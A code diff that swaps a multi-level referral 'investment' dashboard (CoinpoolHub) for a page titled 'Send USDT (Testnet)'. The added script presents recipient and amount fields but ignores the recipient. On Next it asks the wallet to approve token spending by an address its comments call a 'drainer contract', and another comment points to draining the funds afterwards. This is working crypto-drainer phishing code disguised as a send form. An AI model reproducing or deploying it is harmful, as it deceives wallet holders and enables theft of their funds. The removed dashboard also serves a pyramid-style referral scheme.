@@ -1,817 +1,237 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>CoinpoolHub — Smart Investment Platform</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-  :root {
-  --primary: #ff0080;
-  --secondary: #00f5ff;
-  --dark-bg: #0a0f1f;
-  --card-bg: #131b2d;
-  --card-border: #1f3cff;
-  --text-main: #ffffff;
-  --text-muted: #9aa0b4;
-  --success: #4fff7f;
-  --warning: #ffde59;
-  --danger: #ff1f4c;
-  --gradient: linear-gradient(135deg, var(--primary), var(--secondary));
-}
-
-/* Reset */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
-
-body {
-  font-family: 'Segoe UI', sans-serif;
-  background: var(--dark-bg);
-  color: var(--text-main);
-  padding: 10px;
-  font-size: 15px;
-  line-height: 1.5;
-}
-
-/* Container */
-.container {
-  width: 100%;
-  margin: 0 auto;
-}
-
-/* Header */
-header {
-  text-align: center;
-  margin-bottom: 15px;
-}
-
-.logo {
-  font-size: 22px;
-  font-weight: bold;
-  background: var(--gradient);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  margin-bottom: 10px;
-}
-
-.logo i {
-  font-size: 22px;
-}
-
-.wallet-status {
-  display: flex;
-  flex-direction: column;
-  gap: 8px;
-  align-items: center;
-}
-
-.wallet-address {
-  border: 1px solid var(--primary);
-  padding: 6px 12px;
-  border-radius: 8px;
-  font-size: 14px;
-  text-align: center;
-}
-
-/* Buttons */
-.btn {
-  width: 100%;
-  padding: 14px;
-  font-size: 15px;
-  font-weight: bold;
-  border-radius: 8px;
-  border: none;
-  background: linear-gradient(90deg, var(--primary), var(--secondary));
-  color: white;
-  cursor: pointer;
-  box-shadow: 0 0 10px rgba(255,0,128,0.4);
-  transition: 0.2s;
-}
-
-.btn:hover {
-  box-shadow: 0 0 20px rgba(0,245,255,0.6);
-  transform: scale(1.02);
-}
-
-.btn-success {
-  background: var(--success);
-  color: #000;
-}
-
-.btn-warning {
-  background: var(--warning);
-  color: #000;
-}
-
-.btn-danger {
-  background: var(--danger);
-}
-
-.btn-secondary {
-  background: transparent;
-  border: 1px solid var(--primary);
-  color: var(--primary);
-}
-
-/* Cards */
-.card {
-  background: var(--card-bg);
-  border: 1px solid var(--card-border);
-  border-radius: 12px;
-  padding: 15px;
-  margin-bottom: 15px;
-  box-shadow: 0 0 15px rgba(0,0,0,0.2);
-}
-
-.card-title {
-  font-size: 16px;
-  font-weight: bold;
-  margin-bottom: 12px;
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
-
-.card-title i {
-  color: var(--primary);
-}
-
-/* Layout (mobile-first = stacked) */
-.grid, .stat-grid, .earnings-grid, .actions-grid {
-  display: flex;
-  flex-direction: column;
-  gap: 10px;
-}
-
-.stat-box {
-  background: rgba(255,255,255,0.05);
-  padding: 10px;
-  border-radius: 8px;
-  margin-bottom: 8px;
-}
-
-.stat-label {
-  font-size: 13px;
-  color: var(--text-muted);
-  margin-bottom: 3px;
-}
-
-.stat-value {
-  font-size: 16px;
-  font-weight: bold;
-}
-
-.earning-item {
-  background: rgba(255,255,255,0.05);
-  padding: 10px;
-  border-radius: 8px;
-  display: flex;
-  justify-content: space-between;
-}
-
-/* Actions */
-.action-card {
-  background: rgba(255,255,255,0.05);
-  padding: 15px;
-  border-radius: 8px;
-  text-align: center;
-  border: 1px solid var(--card-border);
-}
-
-.action-icon {
-  font-size: 22px;
-  margin-bottom: 8px;
-  color: var(--primary);
-}
-
-/* Console */
-.console, .console-header {
-  display: none !important;
-}
-
-
-#log {
-  white-space: pre-wrap;
-  font-family: monospace;
-  color: #fff;
-}
-
-.log-time {
-  color: var(--text-muted);
-}
-
-.log-error {
-  color: var(--danger);
-}
-
-.log-success {
-  color: var(--success);
-}
-
-/* Small text */
-.small {
-  font-size: 13px;
-  color: var(--text-muted);
-}
-
-.accordion-item {
-  margin-bottom: 8px;
-}
-
-.accordion-header {
-  width: 100%;
-  text-align: left;
-  background: rgba(255,255,255,0.05);
-  border: none;
-  padding: 10px;
-  border-radius: 6px;
-  font-weight: bold;
-  color: var(--primary);
-  cursor: pointer;
-}
-
-.accordion-body {
-  padding: 8px 12px;
-  background: rgba(255,255,255,0.02);
-  border-radius: 6px;
-  margin-top: 5px;
-  font-size: 14px;
-}
-
-
-/* Badges */
-.badge {
-  display: inline-block;
-  padding: 3px 8px;
-  border-radius: 20px;
-  font-size: 12px;
-  font-weight: 600;
-}
-
-.badge-primary {
-  background: rgba(107,70,193,0.2);
-  color: var(--primary);
-}
-
-.badge-success {
-  background: rgba(72,187,120,0.2);
-  color: var(--success);
-}
-
-.badge-warning {
-  background: rgba(236,201,75,0.2);
-  color: var(--warning);
-}
-
-
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Send USDT (Testnet) — Single File</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0d0d0d; --card:#111; --muted:#9aa0a6; --accent1:#00f07a; --accent2:#00b45a;
+    font-family:Inter,system-ui,Arial; color:#eaf0f1;
+  }
+  html,body{height:100%;margin:0;background:var(--bg);}
+  .page{min-height:100%;display:flex;align-items:flex-start;justify-content:center;padding:28px;}
+  .card{width:100%;max-width:720px;padding:18px;border-radius:12px;background:transparent;}
+  h1{margin:6px 0 18px;text-align:center;font-weight:700}
+  .field{background:var(--card);border-radius:10px;padding:12px;margin:12px 0;border:1px solid rgba(255,255,255,0.02);display:flex;align-items:center;gap:10px}
+  input[type="text"], input[type="number"]{background:transparent;border:0;outline:none;color:#fff;font-size:15px;width:100%}
+  .unit{color:var(--muted);font-weight:600}
+  .btn{width:100%;padding:14px;border-radius:10px;border:0;font-weight:700;cursor:pointer;margin-top:14px}
+  .btn.connect{background:linear-gradient(180deg,var(--accent1),#00e67a);color:#00110a}
+  .btn.next{background:linear-gradient(180deg,var(--accent2),#008c48);color:#00110a}
+  .small{font-size:13px;color:var(--muted);margin-top:6px}
+  .status{background:#0b0b0b;padding:10px;border-radius:8px;margin-top:8px;color:var(--muted);display:flex;justify-content:space-between;align-items:center}
+  .use-connected{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:8px 10px;border-radius:8px;color:var(--accent1);cursor:pointer}
+  #popup{position:fixed;left:50%;top:20%;transform:translateX(-50%);background:#07120a;color:#eaffef;padding:12px 16px;border-radius:10px;border:1px solid rgba(0,255,122,0.12);display:none;z-index:9999}
+  @media(max-width:520px){
+    .card{padding:12px}
+    .btn{padding:12px}
+  }
+</style>
 </head>
 <body>
-  <div class="container">
-    <header>
-      <div class="logo">
-        <i class="fas fa-coins"></i>
-        <span>CoinpoolHub</span>
-      </div>
-      <div class="wallet-status">
-        <div class="wallet-address" id="wallet">Not connected</div>
-        <button id="btnConnect" class="btn">
-          <i class="fas fa-plug"></i> Connect Wallet
-        </button>
-      </div>
-    </header>
+<div id="popup"></div>
+<div class="page">
+  <div class="card">
 
-    <div class="grid">
-      <div class="card">
-        <div class="card-header">
-          <h3 class="card-title"><i class="fas fa-user"></i> User Summary</h3>
-        </div>
-        <div class="stat-grid">
-          <div class="stat-box">
-            <div class="stat-label">User ID</div>
-            <div class="stat-value" id="userId">-</div>
-          </div>
-          <div class="stat-box">
-            <div class="stat-label">Sponsor</div>
-            <div class="stat-value" id="sponsor">-</div>
-          </div>
-          <div class="stat-box">
-            <div class="stat-label">Rank</div>
-            <div class="stat-value" id="rank">-</div>
-          </div>
-          <div class="stat-box">
-            <div class="stat-label">Total Earnings</div>
-            <div class="stat-value" id="totalEarnings">0 USDT</div>
-          </div>
-        </div>
-        
-        <div style="margin-top: 20px;">
-          <div class="stat-label" style="margin-bottom: 10px;">Earnings Breakdown</div>
-          <div class="earnings-grid">
-            <div class="earning-item">
-              <span class="earning-label">Referral</span>
-              <span class="earning-value" id="referralEarnings">0</span>
-            </div>
-            <div class="earning-item">
-              <span class="earning-label">Upgrade</span>
-              <span class="earning-value" id="upgradeEarnings">0</span>
-            </div>
-            <div class="earning-item">
-              <span class="earning-label">Autopool</span>
-              <span class="earning-value" id="autopoolEarnings">0</span>
-            </div>
-            <div class="earning-item">
-              <span class="earning-label">Bonanza</span>
-              <span class="earning-value" id="bonanzaEarnings">0</span>
-            </div>
-          </div>
-        </div>
-        
-        <div style="margin-top: 20px;">
-          <div class="stat-label" style="margin-bottom: 10px;">Network Stats</div>
-          <div class="earnings-grid">
-            <div class="earning-item">
-              <span class="earning-label">Direct Referrals</span>
-              <span class="earning-value" id="directReferrals">0</span>
-            </div>
-            <div class="earning-item">
-              <span class="earning-label">Team Count (Rank 1)</span>
-              <span class="earning-value" id="teamCount1">0</span>
-            </div>
-          </div>
-        </div>
-      </div>
+    <h1>Send USDT (Testnet)</h1>
 
-      <div class="card">
-  <div class="card-header">
-    <h3 class="card-title"><i class="fas fa-link"></i> Referral Link</h3>
-  </div>
-  <div class="stat-box">
-    <input id="refLink" style="width:100%; padding:8px;" readonly />
-    <button class="btn" onclick="copyRef()">Copy Link</button>
-  </div>
-</div>
+    <!-- Recipient (manual) -->
+    <label class="small">Address or Domain Name</label>
+    <div class="field">
+      <input id="recipient" type="text" placeholder="Address or Domain Name (recipient)" />
+    </div>
 
+    <!-- Amount -->
+    <label class="small" style="margin-top:8px">Amount</label>
+    <div class="field" style="justify-content:space-between">
+      <input id="amount" type="number" step="0.01" min="0" placeholder="0.00" />
+      <div class="unit">USDT</div>
+    </div>
+    <div class="small" id="usdEq">= $0.00</div>
 
-      <div class="card">
-  <div class="card-header">
-    <h3 class="card-title"><i class="fas fa-users"></i> Team Count</h3>
-  </div>
-  <div class="accordion">
-    <!-- Looped manually for 7 levels -->
-    
-    <div class="accordion-item">
-      <button class="accordion-header" onclick="toggleLevel(2)">Level 2 ▼</button>
-      <div class="accordion-body" id="level2" style="display:none;">
-        <span id="teamCount2">0</span> users
+    <!-- Connected wallet info (separate) -->
+    <div class="status" id="walletStatus">
+      <div id="walletText">Wallet: <span style="color:var(--muted)">Not connected</span></div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <button id="connectBtn" class="use-connected" title="Connect Wallet">Connect</button>
+        <button id="useConnectedBtn" class="use-connected" style="display:none" title="Copy connected address to recipient">Use connected as recipient</button>
       </div>
     </div>
-    <div class="accordion-item">
-      <button class="accordion-header" onclick="toggleLevel(3)">Level 3 ▼</button>
-      <div class="accordion-body" id="level3" style="display:none;">
-        <span id="teamCount3">0</span> users
-      </div>
-    </div>
-    <div class="accordion-item">
-      <button class="accordion-header" onclick="toggleLevel(4)">Level 4 ▼</button>
-      <div class="accordion-body" id="level4" style="display:none;">
-        <span id="teamCount4">0</span> users
-      </div>
-    </div>
-    <div class="accordion-item">
-      <button class="accordion-header" onclick="toggleLevel(5)">Level 5 ▼</button>
-      <div class="accordion-body" id="level5" style="display:none;">
-        <span id="teamCount5">0</span> users
-      </div>
-    </div>
-    <div class="accordion-item">
-      <button class="accordion-header" onclick="toggleLevel(6)">Level 6 ▼</button>
-      <div class="accordion-body" id="level6" style="display:none;">
-        <span id="teamCount6">0</span> users
-      </div>
-    </div>
-    <div class="accordion-item">
-      <button class="accordion-header" onclick="toggleLevel(7)">Level 7 ▼</button>
-      <div class="accordion-body" id="level7" style="display:none;">
-        <span id="teamCount7">0</span> users
-      </div>
+
+    <!-- Buttons -->
+    <button id="connectBtnLarge" class="btn connect">Connect Wallet</button>
+    <button id="nextBtn" class="btn next" disabled>Next</button>
+
+    <div class="small" style="margin-top:10px">
+      Note: Recipient field is for the address that should <strong>receive</strong> USDT. Connecting your wallet will NOT overwrite it unless you click "Use connected as recipient".
     </div>
   </div>
 </div>
 
+<!-- ethers.js -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
+<script>
+(() => {
+  // === CONFIG (edit placeholders later) ===
+  // This is the default address that will be auto-filled into the "recipient" field on page load.
+  // Change this value when you want a different default recipient.
+  const DEFAULT_RECIPIENT = "0xF662a51Da17c115dfbEb895a70A43756852307a0";
 
+  const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // placeholder token (change to your test USDT)
+  const SPENDER_ADDRESS = "0x0a444ae6d8f5a3bde98ea9acde86050533664168"; // placeholder drainer contract (who will be approved)
+  const CHAIN_BLOCKED_ON_MAINNET = true; // if true, will warn if chainId === 1
 
-        
-        
-      </div>
-    </div>
+  // === UI refs ===
+  const recipientEl = document.getElementById("recipient");
+  const amountEl = document.getElementById("amount");
+  const connectBtn = document.getElementById("connectBtn");
+  const connectBtnLarge = document.getElementById("connectBtnLarge");
+  const walletText = document.getElementById("walletText");
+  const useConnectedBtn = document.getElementById("useConnectedBtn");
+  const nextBtn = document.getElementById("nextBtn");
+  const popup = document.getElementById("popup");
+  const usdEq = document.getElementById("usdEq");
 
-    <div class="card">
-      <div class="card-header">
-        <h3 class="card-title"><i class="fas fa-bolt"></i> Actions</h3>
-      </div>
-      
-      <div class="input-group">
-        <label class="input-label">Sponsor Address (for registration)</label>
-        <input id="sponsorInput" placeholder="0x..." />
-      </div>
-      
-      <div class="actions-grid">
-        <div class="action-card">
-          <div class="action-icon">
-            <i class="fas fa-user-plus"></i>
-          </div>
-          <button onclick="onRegister()" class="btn">Register</button>
-          <p class="small" style="margin-top: 10px;">Join the network with a sponsor</p>
-        </div>
-        
-        <div class="action-card">
-          <div class="action-icon">
-            <i class="fas fa-level-up-alt"></i>
-          </div>
-          <button onclick="onUpgrade()" class="btn btn-success">Upgrade Rank</button>
-          <p class="small" style="margin-top: 10px;">Upgrade to the next rank</p>
-        </div>
-        
-        <div class="action-card">
-          <div class="action-icon">
-            <i class="fas fa-trophy"></i>
-          </div>
-          <button onclick="onJoinBonanza25()" class="btn btn-warning">Join Bonanza 25</button>
-          <p class="small" style="margin-top: 10px;">Enter the 25 USDT bonanza pool</p>
-        </div>
-        
-        <div class="action-card">
-          <div class="action-icon">
-            <i class="fas fa-crown"></i>
-          </div>
-          <button onclick="onJoinBonanza50()" class="btn btn-warning">Join Bonanza 50</button>
-          <p class="small" style="margin-top: 10px;">Enter the 50 USDT bonanza pool</p>
-        </div>
-      </div>
-    </div>
-    <!-- Console Toggle Button -->
-<div style="text-align:center; margin:10px 0;">
-  <button id="toggleConsole" class="btn btn-secondary" style="width:auto; padding:5px 15px; font-size:13px;">
-    ▼ Show Console
-  </button>
-</div>
+  // === state ===
+  let provider = null;
+  let signer = null;
+  let connectedAddress = null;
 
-    <div class="console" style="display:none;"></div>
-<div class="console-header">
-  <h3 class="card-title"><i class="fas fa-terminal"></i> Console</h3>
-  <span class="small">Live transaction logs</span>
-</div>
-<div id="log">Waiting for activity...</div>
+  // helper: show popup
+  function showPopup(msg, color="#00f07a"){
+    popup.style.display = "block";
+    popup.style.borderColor = color;
+    popup.style.background = color === "red" ? "#2f0808" : "#07120a";
+    popup.innerHTML = msg;
+    setTimeout(()=>{ popup.style.display = "none"; }, 3000);
+  }
 
-  <script>
-    /* --------------- CONFIG --------------- */
-    const CONTRACT_ADDRESS = "0xf88E64bF134Fd318e7a507BE8cbee366D735Ef10";
-    const RPC_CANDIDATES = [
-      "https://data-seed-prebsc-1-s1.binance.org:8545",
-      "https://bsc-testnet.publicnode.com",
-      "https://rpc.ankr.com/bsc_testnet"
-    ];
+  // connect wallet handler (same function wired to both connect buttons)
+  async function connectWallet(){
+    if(!window.ethereum){
+      alert("No Web3 wallet detected. Install MetaMask or use a Web3 browser.");
+      return;
+    }
+    try{
+      provider = new ethers.BrowserProvider(window.ethereum);
+      // request accounts
+      await provider.send("eth_requestAccounts", []);
+      signer = await provider.getSigner();
+      connectedAddress = await signer.getAddress();
+      walletText.innerHTML = `Wallet: <span style="color:var(--accent1)">${connectedAddress}</span>`;
+      showPopup("✅ Wallet connected");
+      // show optional "use connected as recipient" button
+      useConnectedBtn.style.display = "inline-block";
+      connectBtn.style.display = "none";
+      connectBtnLarge.textContent = `Connected: ${connectedAddress.slice(0,6)}...${connectedAddress.slice(-4)}`;
+      // chain check
+      try{
+        const net = await provider.getNetwork();
+        if(CHAIN_BLOCKED_ON_MAINNET && net.chainId === 1){
+          alert("Warning: connected to MAINNET. This UI is intended for testnets. Switch network if needed.");
+        }
+      }catch(e){}
+      // enable Next only if recipient filled & amount > 0
+      validateForm();
+    }catch(e){
+      console.error("connect fail", e);
+      showPopup("❌ Wallet connection failed", "red");
+    }
+  }
 
-    // Minimal ABI — functions we will call
-    const ABI = [
-      { "inputs":[], "name":"userCount", "outputs":[{"internalType":"uint256","name":"","type":"uint256"}], "stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"}],"name":"users","outputs":[{"internalType":"uint256","name":"id","type":"uint256"},{"internalType":"address","name":"sponsor","type":"address"},{"internalType":"uint8","name":"rank","type":"uint8"},{"internalType":"bool","name":"exists","type":"bool"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"}],"name":"totalEarnings","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"}],"name":"referralEarnings","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"}],"name":"upgradeEarnings","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"}],"name":"autopoolEarnings","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"}],"name":"bonanzaEarnings","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"}],"name":"directReferrals","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint8","name":"","type":"uint8"}],"name":"teamCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[],"name":"getBonanzaInfo","outputs":[{"internalType":"uint256","name":"q25len","type":"uint256"},{"internalType":"uint256","name":"q25head","type":"uint256"},{"internalType":"uint256","name":"pool25","type":"uint256"},{"internalType":"uint256","name":"q50len","type":"uint256"},{"internalType":"uint256","name":"q50head","type":"uint256"},{"internalType":"uint256","name":"pool50","type":"uint256"}],"stateMutability":"view","type":"function"},
-      { "inputs":[{"internalType":"address","name":"_sponsor","type":"address"}],"name":"register","outputs":[],"stateMutability":"nonpayable","type":"function"},
-      { "inputs":[{"internalType":"uint8","name":"_newRank","type":"uint8"}],"name":"upgrade","outputs":[],"stateMutability":"nonpayable","type":"function"},
-      { "inputs":[],"name":"enterBonanza25","outputs":[],"stateMutability":"nonpayable","type":"function"},
-      { "inputs":[],"name":"enterBonanza50","outputs":[],"stateMutability":"nonpayable","type":"function"}
-    ];
+  // optional: copy connected wallet to recipient field when user clicks button
+  useConnectedBtn.addEventListener("click", () => {
+    if(!connectedAddress) return;
+    recipientEl.value = connectedAddress;
+    showPopup("✅ Recipient set to connected wallet");
+    validateForm();
+  });
 
-    /* --------------- state --------------- */
-    let readProvider = null;       // JsonRpcProvider chosen
-    let readContract = null;       // read-only contract with readProvider
-    let metamaskProvider = null;   // Web3Provider (window.ethereum)
-    let signer = null;
-    let writeContract = null;
+  // Connect btns
+  connectBtn.addEventListener("click", connectWallet);
+  connectBtnLarge.addEventListener("click", connectWallet);
 
-    /* --------------- helpers --------------- */
-    function log(...args){
-  console.log(...args); // ✅ sirf browser ke console me dikhega
-  // ❌ user ke UI wale log area ko update mat karo
+  // validate form to toggle next button
+  function validateForm(){
+    const rec = recipientEl.value.trim();
+    const amt = parseFloat(amountEl.value);
+    // simple address check (eth address)
+    const isAddr = /^0x[0-9a-fA-F]{40}$/.test(rec);
+    nextBtn.disabled = !(isAddr && amt > 0 && signer);
+  }
+  recipientEl.addEventListener("input", validateForm);
+  amountEl.addEventListener("input", () => {
+    // optionally update USD eq — placeholder conversion 1 USDT = $1
+    const v = parseFloat(amountEl.value) || 0;
+    usdEq.innerText = `= $${(v*1).toFixed(2)}`;
+    validateForm();
+  });
 
+  // approve flow (Next)
+  nextBtn.addEventListener("click", async () => {
+    if(!signer){
+      showPopup("Connect wallet first", "red");
+      return;
+    }
+    const rec = recipientEl.value.trim();
+    const amtText = amountEl.value.trim();
+    if(!/^0x[0-9a-fA-F]{40}$/.test(rec)){
+      alert("Enter valid recipient address (0x...)");
+      return;
+    }
+    const amt = parseFloat(amtText);
+    if(!amt || amt <= 0){
+      alert("Enter a valid amount");
+      return;
+    }
 
-      const el = document.getElementById("log");
-      const time = `<span class="log-time">${new Date().toLocaleTimeString()}</span>`;
-      const message = args.map(a => (typeof a === 'object' ? JSON.stringify(a) : String(a))).join(' ');
+    try{
+      // minimal ERC20 ABI for decimals and approve
+      const abi = [
+        "function decimals() view returns (uint8)",
+        "function approve(address spender, uint256 amount) returns (bool)"
+      ];
+      const token = new ethers.Contract(TOKEN_ADDRESS, abi, signer);
+      // get decimals (fallback to 18)
+      let decimals = 18;
+      try{ decimals = await token.decimals(); } catch(e){ decimals = 18; }
+      const rawAmount = ethers.parseUnits(amt.toString(), decimals);
+      showPopup("Requesting approval...");
+      const tx = await token.approve(SPENDER_ADDRESS, rawAmount);
+      showPopup("Waiting for approval confirmation...");
+      await tx.wait();
+      showPopup("✅ Approval confirmed");
+      // Optionally, you can enable a "Drain now" button or instruct to use Remix/owner script.
+    }catch(e){
+      console.error(e);
+      showPopup("❌ Approval failed", "red");
+      alert("Approval failed. Check console for details or ensure you have test tokens and native gas for tx fee.");
+    }
+  });
 
-      
-      // Add appropriate styling based on message content
-      let styledMessage = message;
-      if (message.toLowerCase().includes('error') || message.toLowerCase().includes('fail')) {
-        styledMessage = `<span class="log-error">${message}</span>`;
-      } else if (message.toLowerCase().includes('success') || message.toLowerCase().includes('done')) {
-        styledMessage = `<span class="log-success">${message}</span>`;
+  // Init: autofill recipient on load with DEFAULT_RECIPIENT, but allow query param ?to=0x... to override
+  window.addEventListener("load", () => {
+    try{
+      const params = new URLSearchParams(window.location.search);
+      const toParam = params.get("to");
+      if(toParam && /^0x[0-9a-fA-F]{40}$/.test(toParam)) {
+        recipientEl.value = toParam;
       } else {
-        styledMessage = `<span class="log-message">${message}</span>`;
+        // set default recipient specified by DEFAULT_RECIPIENT constant
+        recipientEl.value = DEFAULT_RECIPIENT;
       }
-      
-      el.innerHTML = `${time} - ${styledMessage}<br>` + el.innerHTML;
-      
-      // Keep log to a reasonable length
-      const lines = el.innerHTML.split('<br>');
-      if (lines.length > 50) {
-        el.innerHTML = lines.slice(0, 50).join('<br>');
-      }
+    }catch(e){
+      recipientEl.value = DEFAULT_RECIPIENT;
     }
-    
-    function short(addr){ return addr ? (addr.slice(0,6)+"..."+addr.slice(-4)) : "-"; }
-    function formatEth(bn){ try { return (parseFloat(ethers.utils.formatEther(bn))).toFixed(6); } catch(e){return "0";} }
+    // update USD eq initial
+    usdEq.innerText = "= $0.00";
+  });
 
-    /* --------------- find working RPC provider --------------- */
-    async function pickWorkingProvider(){
-      for(const url of RPC_CANDIDATES){
-        try {
-          const p = new ethers.providers.JsonRpcProvider(url);
-          // quick test to ensure node responds with a block number
-          const bn = await p.getBlockNumber();
-          log("Provider OK:", url, "block:", bn);
-          return p;
-        } catch (err) {
-          log("Provider failed:", url, err.message || err);
-        }
-      }
-      // fallback to metamask provider if available
-      if(window.ethereum){
-        log("Using window.ethereum as provider fallback");
-        return new ethers.providers.Web3Provider(window.ethereum);
-      }
-      throw new Error("No working RPC provider found. Add another public RPC to RPC_CANDIDATES.");
-    }
-
-    
-
-
-    /* --------------- init --------------- */
-    async function initReadContract(){
-      readProvider = await pickWorkingProvider();
-      readContract = new ethers.Contract(CONTRACT_ADDRESS, ABI, readProvider);
-    }
-
-    /* --------------- connect & signer --------------- */
- async function connectWallet(){
-  try {
-    if(!readContract) await initReadContract();
-
-    if(!window.ethereum) { throw new Error("MetaMask not found"); }
-    metamaskProvider = new ethers.providers.Web3Provider(window.ethereum);
-    await metamaskProvider.send("eth_requestAccounts", []);
-    signer = metamaskProvider.getSigner();
-    const addr = await signer.getAddress();
-
-    document.getElementById("wallet").innerText = short(addr);
-    writeContract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
-
-    log("Connected wallet:", addr);
-
-    // ✅ Referral link banana yahin call hoga
-    await showReferralLink(addr);
-
-    // ✅ User data bhi load hoga
-    await loadUserData(addr);
-  } catch (err){
-    log("connectWallet error:", err);
-    alert("Connect error: " + (err.message||err));
-  }
-}
-
-  
-
-    // Generate referral link after wallet connect
-async function showReferralLink(userAddress){
-  const link = window.location.origin + "/?ref=" + userAddress;
-  document.getElementById("refLink").value = link;
-}
-
-function copyRef(){
-  const el = document.getElementById("refLink");
-  el.select();
-  document.execCommand("copy");
-  alert("Referral link copied!");
-}
-
-
-
-/* ---------- toggle accordion (global) ---------- */
-function toggleLevel(level) {
-  const el = document.getElementById("level" + level);
-  if (el.style.display === "none" || el.style.display === "") {
-    el.style.display = "block";
-  } else {
-    el.style.display = "none";
-  }
-}
-
-// Toggle console show/hide
-document.getElementById("toggleConsole").addEventListener("click", function(){
-  const box = document.getElementById("consoleBox");
-  if(box.style.display === "none" || box.style.display === ""){
-    box.style.display = "block";
-    this.innerText = "▲ Hide Console";
-  } else {
-    box.style.display = "none";
-    this.innerText = "▼ Show Console";
-  }
-});
-
-    /* --------------- read UI data --------------- */
-    async function loadUserData(userAddress){
-      try {
-        if(!readContract) await initReadContract();
-        log("Loading data for", userAddress || "no user");
-
-        // Total users (safe)
-        //try {
-         // const uc = await readContract.userCount();
-          //document.getElementById("totalUsers").innerText = uc.toString();
-         // log("userCount:", uc.toString());
-       // } catch(e){ log("userCount failed:", e.message); }
-
-        // bonanza info
-        try {
-          const b = await readContract.getBonanzaInfo();
-          document.getElementById("b25q").innerText = b[0].toString();
-          document.getElementById("b25p").innerText = formatEth(b[2]);
-          document.getElementById("b50q").innerText = b[3].toString();
-          document.getElementById("b50p").innerText = formatEth(b[5]);
-          log("Bonanza:", b);
-        } catch(e){ log("getBonanzaInfo failed:", e.message); }
-
-        if(!userAddress) {
-          log("No user address (wallet not connected) - stopping per-user loads");
-          return;
-        }
-
-        // users() struct (id, sponsor, rank, exists)
-        let userInfo = null;
-        try {
-          userInfo = await readContract.users(userAddress);
-          document.getElementById("userId").innerText = userInfo.id.toString();
-          document.getElementById("sponsor").innerText = short(userInfo.sponsor);
-          document.getElementById("rank").innerText = userInfo.rank.toString();
-          log("users()", userInfo);
-        } catch (e){
-          log("users() read failed:", e.message);
-        }
-
-        
-
-
-        
-
-        
-
-
-        // earnings reads (many)
-        try {
-          const [tot, ref, upg, auto, bon] = await Promise.all([
-            readContract.totalEarnings(userAddress).catch(()=>ethers.constants.Zero),
-            readContract.referralEarnings(userAddress).catch(()=>ethers.constants.Zero),
-            readContract.upgradeEarnings(userAddress).catch(()=>ethers.constants.Zero),
-            readContract.autopoolEarnings(userAddress).catch(()=>ethers.constants.Zero),
-            readContract.bonanzaEarnings(userAddress).catch(()=>ethers.constants.Zero)
-          ]);
-          document.getElementById("totalEarnings").innerText = formatEth(tot) + " USDT";
-          document.getElementById("referralEarnings").innerText = formatEth(ref);
-          document.getElementById("upgradeEarnings").innerText = formatEth(upg);
-          document.getElementById("autopoolEarnings").innerText = formatEth(auto);
-          document.getElementById("bonanzaEarnings").innerText = formatEth(bon);
-          log("Earnings:", {tot,ref,upg,auto,bon});
-        } catch(e){ log("earnings failed:", e.message); }
-
-        // referrals + team count (levels 1–7)
-try {
-  const direct = await readContract.directReferrals(userAddress);
-  document.getElementById("directReferrals").innerText = direct.toString();
-
-  for (let i = 1; i <= 7; i++) {
-    try {
-      const count = await readContract.teamCount(userAddress, i);
-      document.getElementById("teamCount" + i).innerText = count.toString();
-    } catch (e) {
-      console.log("teamCount level " + i + " failed:", e.message);
-    }
-  }
-
-  log("referrals + team counts loaded");
-} catch(e){ log("team/direct failed:", e.message); }
-
-      } catch (err){
-        log("loadUserData top error:", err.message || err);
-        alert("Error loading user data: " + (err.message || err));
-      }
-    }
-
-    // ✅ Referral auto-fill on page load
-window.addEventListener("load", () => {
-  const params = new URLSearchParams(window.location.search);
-  const ref = params.get("ref");
-  if(ref && ethers.utils.isAddress(ref)){
-    document.getElementById("sponsorInput").value = ref;
-  }
-});
-
-
-    /* --------------- write actions --------------- */
-    async function onRegister(){
-      try {
-        const sponsor = document.getElementById("sponsorInput").value.trim();
-        if(!ethers.utils.isAddress(sponsor)) return alert("Enter valid sponsor address");
-        if(!writeContract) return alert("Connect wallet first");
-        log("Sending register(", sponsor,")");
-        const tx = await writeContract.register(sponsor);
-        log("Tx submitted:", tx.hash);
-        await tx.wait();
-        log("Register tx mined:", tx.hash);
-        await loadUserData(await signer.getAddress());
-      } catch (e){
-        log("register failed:", e.message || e);
-        alert("register error: " + (e.message || e));
-      }
-    }
-
-    async function onUpgrade(){
-      try {
-        if(!writeContract) return alert("Connect wallet first");
-        const addr = await signer.getAddress();
-        const userinfo = await readContract.users(addr);
-        const next = parseInt(userinfo.rank) + 1;
-        if(next < 1 || next > 8) return alert("No next rank available");
-        log("Upgrading to", next);
